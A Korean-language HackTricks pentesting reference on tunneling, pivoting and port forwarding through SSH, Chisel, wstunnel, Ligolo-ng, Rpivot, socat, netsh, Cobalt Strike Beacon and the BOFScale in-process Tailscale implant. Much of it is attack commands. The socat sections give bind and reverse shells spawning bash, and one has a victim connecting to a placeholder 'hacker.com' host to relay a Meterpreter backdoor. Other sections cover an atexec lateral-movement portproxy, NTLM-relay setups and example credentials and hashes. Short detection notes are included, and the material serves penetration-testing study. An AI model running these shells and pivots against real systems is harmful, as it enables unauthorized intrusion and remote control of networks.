# 터널링 및 포트 포워딩

{{#include ../banners/hacktricks-training.md}}

## Nmap 팁

> [!WARNING]
> Nmap의 proxy 지원은 TCP 연결로 제한되며 ping, 포트 또는 OS 탐지 스캔에는 영향을 주지 않습니다. 스캐너가 SOCKS proxy 뒤에 있는 경우 **호스트 탐지를 비활성화**하고 (`-Pn`) **TCP connect scan**을 사용하세요 (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

최종 명령은 계정과 WinRM 호스트를 지정하기 위해 Evil-WinRM의 `-u` 및 `-i` 옵션을 사용합니다. 기본 WinRM 포트는 5985입니다.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH는 암호화된 채널을 통해 X11 연결, 임의의 TCP 포트, Unix 도메인 소켓을 포워딩할 수 있습니다.<sup>[[6]](#references)</sup>

SSH 그래픽 연결(X)

`-Y`는 신뢰된 X11 포워딩을 활성화하고, `-C`는 포워딩되는 데이터의 압축을 요청합니다.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

SSH Server에서 새 Port 열기 --> Other port

Remote (`-R`) forwarding은 SSH server에서 수신 대기하고 로컬 측에 연결합니다. 명시적인 bind address는 해당 listener에 연결할 수 있는 인터페이스를 제어합니다.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

로컬 포트 --> 침해된 호스트 (SSH) --> Third_box:Port

로컬 (`-L`) 포워딩은 클라이언트에서 수신 대기하고 SSH 서버 측에서 목적지에 연결합니다.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

로컬 포트 --> 침해된 호스트 (SSH) --> 어디든

동적(`-D`) 포워딩은 원격 측에서 연결을 여는 로컬 SOCKS4/SOCKS5 리스너를 생성합니다.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### ProxyJump를 사용한 Multi-hop

`-J`/`ProxyJump`는 쉼표로 구분된 하나 이상의 jump host를 거쳐 target에 연결합니다. Forwarding 옵션은 여전히 최종 SSH 연결에 적용되므로, 아래의 SOCKS listener는 첫 번째 bastion이 아니라 `internal-target`에서 목적지에 연결합니다. 이렇게 하면 jump host에 로그인한 뒤 그곳에서 두 번째 SSH client를 시작할 필요가 없습니다.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

점프 머신별 옵션은 `~/.ssh/config`에 설정해야 합니다. 대상 호스트용으로 지정한 명령줄 설정은 중간 호스트에 자동으로 적용되지 않습니다.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

내부 호스트에서 DMZ를 거쳐 사용자 호스트로 reverse shell을 가져올 때 유용합니다.

서버의 `GatewayPorts` 설정은 remote forward가 loopback 이외의 주소에 바인딩될 수 있는지를 제어하며, 기본값은 `no`입니다.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

이 root 기반 예제는 양쪽 호스트에 터널 장치를 생성합니다. 서버에서 tun forwarding을 허용해야 하며, 선택한 계정은 tun 장치에 액세스할 수 있어야 합니다. 여기서 `root` 계정을 사용하는 한 가지 방법은 `PermitRootLogin yes`를 설정하는 것입니다.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

서버 측에서 포워딩 활성화

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

클라이언트 측에 새 라우트 설정하기

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **보안 – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6에는 Terrapin의 초기 전송 무결성 공격에 대응하기 위해 strict-KEX 확장이 추가되었습니다. 가능한 경우 양쪽 피어를 모두 업데이트하고, 이전 구현에서는 포워딩된 채널이 버전만으로 보호된다고 가정하지 말고 공급업체의 지침을 따르세요.<sup>[[8]](#references)</sup>

## SSHUTTLE

호스트를 통해 서브네트워크로 향하는 모든 트래픽을 **ssh**로 **tunnel**링할 수 있습니다.\
예를 들어, 10.10.10.0/24로 향하는 모든 트래픽을 포워딩할 수 있습니다.

`sshuttle`은 SSH를 통한 투명 프록시를 제공하며, 아래와 같이 서브넷과 사용자 지정 SSH 명령을 선택할 수 있습니다.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

개인 키로 연결

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit의 `portfwd`는 local 및 remote forwarding을 지원하며, SOCKS proxy 모듈은 session routes 또는 `autoroute`와 함께 작동하도록 설계되었습니다. 이 예시에서는 기본적으로 포트 1080에서 수신 대기합니다.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

로컬 포트 --> 침해된 호스트 (활성 세션) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

또 다른 방법:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike의 Beacon은 SOCKS4a/SOCKS5 연결을 Beacon을 통해 릴레이할 수 있습니다. `rportfwd`는 침해된 호스트에서 바인딩하고, `rportfwd_local`은 Cobalt Strike 클라이언트에서 대상 연결을 시작합니다.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon을 통해 트래픽을 라우팅할 인터페이스에서 Team Server의 포트를 엽니다.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> 이 경우 **포트는 Team Server가 아니라 Beacon 호스트에서 열리며**, 트래픽은 Team Server로 전송된 후 그곳에서 지정된 host:port로 전달됩니다.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

The reverse-forwarding manual은 다음과 같은 동작을 설명합니다:<sup>[[14]](#references)</sup>

- Beacon의 reverse port forward는 **개별 머신 간의 릴레이가 아니라 Team Server로 트래픽을 터널링하도록 설계되었습니다**.
- P2P 링크를 포함해 트래픽은 **Beacon의 C2 트래픽 내에서 터널링됩니다**.
- 높은 포트는 일반적으로 privileged-port 제한을 피할 수 있지만, 대상 OS 정책과 기존 listener는 여전히 적용됩니다.

### rPort2Port local

> [!WARNING]
> 이 경우 **포트는 Team Server가 아니라 Beacon host에서 열리며**, **트래픽은 Team Server가 아니라 Cobalt Strike client로 전송된 다음**, 거기서 지정된 host:port로 전달됩니다.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## BOFScale - CDN-fronted in-process tailnet

[BOFScale](https://github.com/NetSPI/BOFscale)는 TUN driver나 service를 설치하지 않고 Windows C2 implant 내부에서 수정된 Tailscale overlay를 실행합니다. 세 가지 구성 요소는 asynchronous CGo `c-shared` `tailscaled` BOF-PE, local API와 통신하는 소형 C++ BOF-PE, asynchronous `socksportfwd` TCP-to-SOCKS5 bridge입니다.<sup>[[53]](#references)[[54]](#references)</sup>

### CDN-compatible TS2021 및 DERP

Tailscale은 Noise 기반 TS2021 control channel과 DERP relay에 proprietary HTTP upgrades를 사용합니다. BOFScale은 해당 byte stream을 유지하면서 RFC 6455 WebSockets에 담아 전달합니다. 이때 `Sec-WebSocket-Protocol: ts2021` 또는 `derp`를 사용하므로, operator가 관리하는 Headscale/DERP origin을 표준 WebSocket upgrades만 허용하는 CDN 뒤에 둘 수 있습니다. 패치된 client는 HTTP `500` 응답 후 WebSockets를 통해 TS2021을 재시도하고, HTTP `426` 응답 후 DERP를 재시도하며, DERP WebSocket dialer가 host proxy 설정을 따르도록 합니다. BOF는 실패가 확인된 첫 번째 시도를 건너뛰기 위해 `TS_DEBUG_DERP_WS_CLIENT=1`을 설정합니다.<sup>[[53]](#references)[[54]](#references)</sup>

CDN과 origin proxy는 `/ts2021` 및 `/derp`의 WebSocket upgrades를 유지하고, `/key`는 일반 HTTP로 전달하며, relay session이 무기한 열려 있을 수 있으므로 내부 read/write timeouts를 비활성화해야 합니다. 제공된 Headscale 설정은 `verify_clients`를 활성화하고, operator의 embedded DERP map만 게시하며, Tailscale이 운영하는 relay로의 fallback을 방지하기 위해 `derp.urls`를 비워 둡니다.<sup>[[53]](#references)[[54]](#references)</sup>

### In-process daemon 및 named-pipe 제어

별도 설정이 없으면 BOF entry point는 `-tun=userspace-networking`, `-state mem:`, `-no-logs-no-support` 옵션으로 `tailscaled`를 시작한 다음 UUID 이름의 pipe를 생성합니다. Go stdout/stderr를 OS pipe를 통해 Beacon output API로 전달하므로 daemon과 Go runtime 전체는 메모리에 계속 상주하지만, state와 logs는 Tailscale 디렉터리에 기록되지 않습니다.<sup>[[53]](#references)[[54]](#references)</sup>

경량 client는 해당 pipe를 통해 Tailscale의 HTTP/1.0 local API를 재현합니다. daemon의 `safesocket` layer가 pipe client를 impersonate하므로 `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION`으로 pipe를 열고, `Tailscale-Cap: 125`를 전송하며, local API를 `up`, `down`, `status`, route advertisement, shutdown 작업에 매핑합니다.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> daemon에 종료를 요청한 뒤 수동으로 매핑한 Go BOF-PE를 unload하지 마세요. runtime 및 garbage-collector goroutines가 loader가 unmap한 메모리에서 계속 실행될 수 있습니다. `tailscaled`를 별도의 sacrificial process에서 실행하고, 최종 정리 시 해당 process를 종료하세요.<sup>[[54]](#references)</sup>

### Userspace SOCKS5를 통해 host에서 시작된 traffic 연결

Inbound tailnet connections와 광고된 subnet routes는 userspace network stack 내에서 작동하지만, 침해된 host의 일반 process에는 overlay로 향하는 OS route가 없습니다. 따라서 `socksportfwd`는 victim 측 TCP port에서 listen하고, daemon의 `0.0.0.0:1080` listener와 SOCKS5 `NO AUTH` 협상을 수행한 다음, tailnet destination에 `CONNECT`를 요청하고 양방향 traffic을 비동기적으로 relay합니다. 대상이 MagicDNS name인 경우 `ATYP_DOMAIN`을 사용하여 `tailscaled`가 이름을 resolve하도록 하며, 이를 Windows resolver에 노출하지 않습니다.<sup>[[53]](#references)[[54]](#references)</sup>

최소한의 operator workflow는 아래와 같습니다. stock Tailscale은 이 CDN 설계를 통과할 수 없으므로 operator node와 implant 모두 패치된 binaries를 사용해야 합니다.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

로컬 포워드는 겉으로 보이는 인증 리스너와 relay 도구를 분리할 수 있습니다. 머신이 침해된 호스트의 바인딩된 포트로 인증하도록 유도하고, tailnet을 통해 `ntlmrelayx`로 전달한 다음 AD CS, LDAP, HTTP, SMB 또는 호환되는 다른 대상에 relay합니다. 취약점별 단계는 [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) 및 [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8)를 참조하세요. BOFScale은 전송 수단일 뿐입니다.<sup>[[54]](#references)</sup>

### 탐지

단일한 약한 지표가 아니라 여러 지표의 조합을 찾아보세요. 일반적으로 Go 기반이 아닌 프로세스에서 Go runtime이 실행되는 경우, 느슨한 SDDL `D:(A;;GA;;;WD)`이 적용된 UUID pipe, 예상치 못한 `0.0.0.0:1080` SOCKS 리스너, CDN 주소로 향하는 장시간 유지되는 TLS WebSocket을 확인합니다. TLS inspection을 사용한다면, 소유 프로세스가 허가된 `tailscaled` 서비스가 아닌 경우 `Sec-WebSocket-Protocol: derp` 또는 `ts2021`을 표시하세요. 저장소의 `bofscale.yar` 규칙은 세 가지 BOF-PE 구성 요소 모두에 대한 메모리 시그니처를 제공합니다.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

이 프로젝트는 `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, `tunnel.php`와 같은 web tunnel 엔드포인트를 제공합니다. 로컬 proxy를 시작하기 전에 지원되는 엔드포인트 하나를 업로드하세요.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 releases 페이지에서 다운로드할 수 있습니다.\
Chisel은 SSH로 보호되는 연결을 사용해 HTTP를 통해 TCP/UDP 트래픽을 전달합니다. 호환되는 client/server 빌드를 사용하고 선택한 release의 명령 구문을 확인하세요.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel)은 WebSocket, HTTP/2 또는 WebTransport(QUIC 기반 HTTP/3)를 통해 정적 또는 동적 포워딩을 수행합니다. 현재 빌드는 TCP, UDP, Unix 소켓, stdio, SOCKS5, HTTP 프록시, Linux 투명 프록시 리스너를 포워드 및 리버스 모드로 지원합니다.<sup>[[52]](#references)</sup>

### 리버스 SOCKS5 pivot

공격자 측에서 서버를 실행하고, `-R`을 사용해 pivot이 아웃바운드로 연결하도록 합니다. 이 방향에서는 SOCKS5 리스너가 **서버**에 생성되고, 요청된 연결은 **클라이언트/pivot** 네트워크에서 시작됩니다.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

reverse static forward도 같은 방향을 사용합니다. 예를 들어 다음은 pivot이 접근할 수 있는 `10.10.10.20:445`를 attacker의 loopback 포트 `8445`에서 노출합니다:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Egress 및 전송 세부 정보

- 명시적 HTTP proxy를 통과하려면 클라이언트에 `-p http://user:pass@proxy:8080`을 추가합니다. `curl` 같은 클라이언트에서는 `socks5h://127.0.0.1:1080`을 사용하거나 애플리케이션에서 proxied DNS를 활성화해, 내부 이름이 로컬 resolver로 leak되지 않고 tunnel 너머에서 해석되도록 합니다.<sup>[[52]](#references)</sup>
- `wss://`는 TLS로 보호되는 WebSocket을 선택합니다. `https://` 클라이언트는 HTTP/2를 선택하지만, reverse proxy/CDN의 buffering 또는 HTTP/1 변환으로 양방향 스트림이 자주 중단됩니다. 이 모드를 테스트할 때는 wstunnel server를 직접 노출하세요.<sup>[[52]](#references)</sup>
- `wts://`는 QUIC 기반 WebTransport를 선택합니다. `--enable-webtransport`(또는 `wts://` listen URL)로 server를 시작하고 listen port에서 UDP를 허용하세요. 이 모드는 기존 HTTP `CONNECT` proxy를 통과할 수 없습니다. 해당 proxy는 TCP를 전달하기 때문입니다.<sup>[[52]](#references)</sup>

> [!WARNING]
> upstream project는 내장된 self-signed certificate를 privacy 보호 수단으로 취급하지 말라고 경고합니다. 유효한 custom certificate와 `--tls-verify-certificate`(또는 mTLS)를 사용하고, 원격 접근이 의도된 경우가 아니라면 proxy listener를 loopback에 유지하세요. 기밀성이 중요할 때는 이미 안전한 protocol을 tunnel하세요.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart에서는 proxy의 TUN interface, agent의 certificate fingerprint 검증, 그리고 tunneled network의 route 설정을 안내합니다.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent 바인딩 및 리스닝

Ligolo-ng는 agent에서 proxy 측 주소로 포워딩하는 리스너를 추가할 수 있으며, 예약된 `240.0.0.0/4` 범위로 라우팅해 agent 로컬 서비스에 접근할 수 있습니다.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Agent의 로컬 포트에 액세스

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot은 victim에서 reverse tunnel을 시작하고, attacker의 loopback 주소에서 SOCKS4 proxy를 노출합니다. README에는 NTLM-proxy 자격 증명과 hash 옵션도 설명되어 있습니다.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

NTLM proxy를 통한 **Pivot**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat은 `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, `PROXY`와 같은 주소 유형을 조합합니다. 아래 예제는 문서화된 이러한 엔드포인트를 조합합니다.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### socks를 통한 Port2Port

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### SSL Socat을 통한 Meterpreter

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

socat의 문서화된 `PROXY` 주소 유형을 사용하면 피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행해 **인증되지 않은 proxy**를 통과할 수 있습니다.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat 터널

**/bin/sh 콘솔**

양쪽에 인증서를 생성합니다: Client와 Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

로컬 SSH 포트(22)를 공격자 호스트의 443 포트에 연결합니다.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink는 PuTTY의 명령줄 연결 도구이며, `ssh`와 유사한 SSH 포워딩 옵션을 제공합니다.<sup>[[22]](#references)</sup>

SSH 포트에는 대문자 `-P`를 사용하세요. `-pw`는 호환성을 위해 유지되지만 프로세스 목록에 비밀번호가 노출되므로, 가능한 경우 키 인증이나 `-pwfile`을 사용하세요.<sup>[[22]](#references)[[23]](#references)</sup>

이 바이너리는 피해자 시스템에서 실행되는 SSH 클라이언트이므로 역방향 연결을 위해 SSH 서비스와 포트를 열어야 합니다. 다음 예시에서는 `-R`을 사용해 로컬에서 접근 가능한 포트를 공격자 시스템으로 포워딩합니다.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

영구 `portproxy` 규칙을 만들거나 변경할 때는 호스트에 필요한 권한이 있는 context를 사용하세요. Microsoft는 아래에서 사용하는 `v4tov4` 추가, 표시 및 삭제 형식을 문서화하고 있습니다.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### 예약된 작업을 통해 `portproxy` 배포하기

관리자 자격 증명을 사용할 수 있는 경우, 원격 Task Scheduler 실행을 통해 전용 relay를 업로드하지 않고도 기본 포워딩 규칙을 설치할 수 있습니다. 예를 들어, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md)을 사용하면 pivot이 TCP/443에서 수신 대기하고 내부 SMB 서비스로 연결을 relay하도록 설정할 수 있습니다.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

규칙은 지속되므로 `netsh interface portproxy show v4tov4`로 확인하고 테스트 후 명시적으로 제거하세요. `portproxy`는 포워딩만 제공하므로 호스트 방화벽에서도 수신 포트를 허용해야 합니다.<sup>[[24]](#references)</sup>

## SocksOverRDP & Proxifier

**시스템에 대한 RDP access가 있어야 합니다.**\
다운로드:

SocksOverRDP는 Remote Desktop Dynamic Virtual Channels를 사용해 기존 RDP 세션을 통해 SOCKS5 연결을 전달합니다. 클라이언트 플러그인은 `127.0.0.1:1080`에서 수신 대기하고, 서버 구성 요소는 RDP 대상에서 실행됩니다.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 Remote Desktop Service 기능에 포함된 `Dynamic Virtual Channels`(`DVC`)를 사용합니다. DVC는 **RDP 연결을 통해 패킷을 터널링**하는 역할을 합니다.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

클라이언트 컴퓨터에서 **`SocksOverRDP-Plugin.dll`**을 다음과 같이 로드합니다:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

이제 **`mstsc.exe`**를 사용해 **RDP**로 **victim**에 **연결**할 수 있습니다. **SocksOverRDP plugin이 활성화되어 있다**는 **prompt**가 표시되고, **127.0.0.1:1080**에서 **listen**할 것입니다.

**RDP**로 **연결**한 뒤 victim 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드하고 실행합니다:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

이제 공격자 머신에서 포트 1080이 리스닝 중인지 확인합니다:

```
netstat -antb | findstr 1080
```

이제 [**Proxifier**](https://www.proxifier.com/)를 사용해 해당 포트를 통해 트래픽을 프록시할 수 있습니다.<sup>[[26]](#references)</sup>

### RDP 가상 채널 헌팅

[`rdp2tcp`](../network-services-pentesting/pentesting-rdp.md#rdp-virtual-channel-tunneling)는 또 다른 RDP 가상 채널 터널입니다. 기본 채널 이름은 `rdp2tcp`이지만, 운영자는 다른 이름을 선택할 수 있습니다.<sup>[[56]](#references)</sup> 채널 생성 및 종료는 `Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational`에 이벤트 ID **132** 및 **148**로 기록됩니다. `rdp2tcp` 및 드물거나 무작위인 채널 이름을 찾아본 다음, 이를 `XPSRD`, `cliprdr`, `Microsoft::Windows::RDS::DisplayControl`과 같은 예상 채널과 비교하세요.<sup>[[58]](#references)</sup>

## Windows GUI 앱을 프록시로 연결하기

[**Proxifier**](https://www.proxifier.com/)를 사용하면 Windows GUI 앱이 프록시를 통해 탐색하도록 설정할 수 있습니다.<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers**에서 SOCKS 서버의 IP와 포트를 추가합니다.\
